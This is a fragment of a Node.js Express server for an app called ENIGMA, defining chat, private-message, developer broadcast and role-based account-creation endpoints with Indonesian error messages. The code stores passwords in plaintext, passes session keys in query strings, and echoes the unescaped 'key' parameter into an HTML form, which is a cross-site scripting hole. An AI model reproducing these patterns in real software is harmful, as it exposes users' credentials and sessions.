  const to = String(req.body?.to || '').trim();
  const text = String(req.body?.message || '').trim();
  if (!to || !text) return res.status(400).json({ valid: false, message: 'to and message are required' });
  if (text.length > 2000) return res.status(413).json({ valid: false, message: 'Message too long' });
  const item = { id: user.username + '_' + to + '_' + Date.now(), from: user.username, to, username: user.username, message: text, timestamp: Date.now(), isAI: false, private: true };
  chatPush(privateChatMessages, item);
  return res.status(201).json({ valid: true, message: item });
});
// ===== END ENIGMA PUBLIC + PRIVATE CHAT =====


// ===== ENIGMA ACCOUNT CREATE V1 =====
const CREATE_ROLES = ['tk','tangan_kanan','admin','reseller','owner','member'];
const CREATE_BY = {dev: CREATE_ROLES, tk: CREATE_ROLES, tangan_kanan: CREATE_ROLES, admin:['member','reseller']};
function actor(req){const key=String(req.query.key||req.body?.key||'').trim(), s=activeKeys[key];if(!s)return null;const u=loadDatabase().find(x=>x.username===s.username);return u?{key,user:u}:null;}
function allowed(a,r){return !!a&&(CREATE_BY[String(a.user.role||'member').toLowerCase()]||[]).includes(r);}
app.get('/api/account/create-options',(req,res)=>{const a=actor(req);if(!a)return res.status(401).json({valid:false});const roles=CREATE_BY[String(a.user.role||'member').toLowerCase()]||[];if(!roles.length)return res.status(403).json({valid:false,message:'Role cannot create accounts'});res.json({valid:true,actor:a.user.username,role:a.user.role,roles});});
app.post('/api/account/create',[express.json(),express.urlencoded({extended:true})],(req,res)=>{const a=actor(req),b=req.body||{},u=String(b.username||'').trim().toLowerCase(),p=String(b.password||''),r=String(b.role||'').trim().toLowerCase(),days=Math.min(Math.max(Number(b.days)||30,1),3650);if(!a)return res.status(401).json({valid:false});if(!/^[a-z0-9_.-]{3,32}$/.test(u)||p.length<6)return res.status(400).json({valid:false,message:'Username/password tidak valid'});if(!allowed(a,r))return res.status(403).json({valid:false,message:'Role tidak diizinkan'});const db=loadDatabase();if(db.some(x=>String(x.username).toLowerCase()===u))return res.status(409).json({valid:false,message:'Username sudah ada'});const account={username:u,password:p,role:r,createdBy:a.user.username,createdAt:new Date().toISOString(),expiredDate:new Date(Date.now()+days*86400000).toISOString()};db.push(account);saveDatabase(db);res.status(201).json({valid:true,account:{username:u,role:r,expiredDate:account.expiredDate}});});
app.get('/account/create',(req,res)=>{const a=actor(req);if(!a)return res.status(401).send('Invalid key');const roles=CREATE_BY[String(a.user.role||'member').toLowerCase()]||[];if(!roles.length)return res.status(403).send('Forbidden');res.type('html').send('<h2>ENIGMA CREATE ACCOUNT</h2><p>'+a.user.username+' ('+a.user.role+')</p><form method="post" action="/api/account/create"><input name="key" value="'+String(req.query.key||'')+'" hidden><input name="username" placeholder="username" required><input name="password" placeholder="password" required><select name="role">'+roles.map(x=>'<option value="'+x+'">'+x+'</option>').join('')+'</select><input name="days" value="30" type="number"><button>Create</button></form>');});
// ===== END ENIGMA ACCOUNT CREATE V1 =====

// ===== ENIGMA PRIVATE CHAT + DEV BROADCAST V1 =====
const enigmaPrivateMessages = global.enigmaPrivateMessages || (global.enigmaPrivateMessages = []);
const enigmaBroadcastMessages = global.enigmaBroadcastMessages || (global.enigmaBroadcastMessages = []);
function enigmaActor(req) { try { const key = String(req.query.key || req.body?.key || '').trim(); const s = activeKeys[key]; if (!s) return null; const user = loadDatabase().find(x => x.username === s.username); return user ? { key, user } : { key, user: { username: s.username, role: s.role || 'member' } }; } catch (_) { return null; } }
app.get('/api/private-chat/list', (req,res) => { const a=enigmaActor(req); if(!a) return res.status(401).json({valid:false}); const withUser=String(req.query.with||'').trim(); const messages=enigmaPrivateMessages.filter(m=>(m.from===a.user.username&&(!withUser||m.to===withUser))||(m.to===a.user.username&&(!withUser||m.from===withUser))); res.json({valid:true,messages}); });
app.post('/api/private-chat/send', express.json(), (req,res) => { const a=enigmaActor(req), to=String(req.body?.to||'').trim(), message=String(req.body?.message||'').trim(); if(!a) return res.status(401).json({valid:false}); if(!to||!message) return res.status(400).json({valid:false,message:'to dan message wajib diisi'}); const exists=loadDatabase().some(x=>String(x.username).toLowerCase()===to.toLowerCase()); if(!exists) return res.status(404).json({valid:false,message:'User tujuan tidak ditemukan'}); const item={id:'pm_'+Date.now()+'_'+Math.random().toString(36).slice(2,7),from:a.user.username,to,message,timestamp:new Date().toISOString(),isAI:false}; enigmaPrivateMessages.push(item); res.status(201).json({valid:true,message:item}); });
app.get('/api/broadcast/list', (req,res) => { if(!enigmaActor(req)) return res.status(401).json({valid:false}); res.json({valid:true,messages:enigmaBroadcastMessages.slice(-50)}); });
app.post('/api/broadcast/send', express.json(), (req,res) => { const a=enigmaActor(req), message=String(req.body?.message||'').trim(); if(!a) return res.status(401).json({valid:false}); if(String(a.user.role||'').toLowerCase()!=='dev') return res.status(403).json({valid:false,message:'Khusus Dev'}); if(!message) return res.status(400).json({valid:false,message:'message wajib diisi'}); const item={id:'bc_'+Date.now(),from:a.user.username,message,timestamp:new Date().toISOString(),isBroadcast:true}; enigmaBroadcastMessages.push(item); res.status(201).json({valid:true,message:item}); });
// ===== END ENIGMA PRIVATE CHAT + DEV BROADCAST V1 =====
}

main().catch(console.error);